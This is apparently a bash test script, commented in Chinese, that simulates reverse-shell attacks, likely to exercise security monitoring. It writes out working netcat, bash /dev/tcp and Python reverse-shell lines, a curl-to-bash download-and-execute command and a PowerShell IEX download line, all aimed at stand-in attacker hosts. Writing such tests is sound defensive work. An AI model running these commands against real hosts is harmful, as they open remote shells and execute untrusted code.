#!/bin/bash

# 恶意命令模拟 - 反向 Shell 连接
# ⚠️ 仅用于测试！不要在生产环境运行！

echo "🔴 模拟反向 Shell 攻击"
echo "================================"

# 模拟攻击者尝试建立反向 shell 连接
echo "1. 尝试 netcat 反向连接..."
timeout 2 bash -c "echo 'test' | nc -w 1 attacker.example.com 4444" 2>/dev/null || echo "连接失败（预期）"

echo "2. 尝试 bash 反向连接..."
timeout 2 bash -c "/bin/bash -i >& /dev/tcp/malicious.example.com/4444 0>&1" 2>/dev/null || echo "连接失败（预期）"

echo "3. 尝试 Python 反向连接..."
timeout 2 python3 -c "
import socket,subprocess,os
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(1)
    s.connect(('evil.example.com',4444))
    print('连接测试')
    s.close()
except:
    print('连接失败（预期）')
" 2>/dev/null

echo "4. 模拟下载并执行..."
timeout 2 bash -c "curl -s http://malicious.example.com/payload.sh | bash" 2>/dev/null || echo "下载失败（预期）"

echo "5. 模拟 PowerShell 风格命令..."
timeout 2 bash -c "echo 'IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/p.ps1\")' | base64" 2>/dev/null

echo ""
echo "✅ 反向 Shell 模拟完成"
